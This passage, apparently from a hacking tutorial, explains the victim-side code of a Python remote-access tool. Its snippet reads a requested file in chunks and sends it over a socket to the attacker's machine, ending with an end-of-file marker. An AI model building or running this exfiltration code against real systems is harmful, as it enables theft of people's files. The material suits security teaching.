Here, we are receiving the command and checking the type of command. Once we receive the command, which has a download string inside it, we can strip the download part from the command to retrieve the actual filename we are interested in. On the third line in the previous code, we check whether the file exists. If it does, we send back yes, otherwise we send back no. Remember that in the hacker program, we are waiting to receive this reply in the exists variable. Note that we haven't sent any file data yet. We are just creating the outer loop to properly handle the sending and receiving of data. The read part of the file will be handled in the first if statement in the previous code. Now we will need to read the file.

Let's take a look at the code that follows, which reads the file from the victim's machine and then sends the file back to the hacker:

```
with open(file_to_download, "rb") as file:
    chunk = file.read(CHUNK_SIZE)
    while len(chunk) > 0:
        victim_socket.send(chunk)
        chunk = file.read(CHUNK_SIZE)
        # This will run till the end of file.

# once the file is complete, we need to send the marker.
victim_socket.send(eof_identifier.encode())
print("File sent successfully")
```

Let's break down the code we just saw. The file line is a command to open and read the file in binary format. Even though it is a text file, it is a good idea to read files in binary format if you want to transfer them over the network since the file type could be anything in practical cases. Then we read a chunk of bytes, and we define CHUNK_SIZE = 2048 at the top of the file. After we have read the first chunk, we check whether the file has more bytes. If it has, we send them iteratively over the network by using the while loop until we read the end of the file. This loop will stop when there is no further chunk to read from the file. Once we have sent the complete file over the network to the hacker, we need to send the identifier marker for the hacker to know that they can stop reading further. To do that, we send eof_identifier, which has the following value, eof_identifier = "<END_OF_FILE_IDENTIFIER>". The hacker will use this identifier to know that the incoming data is complete.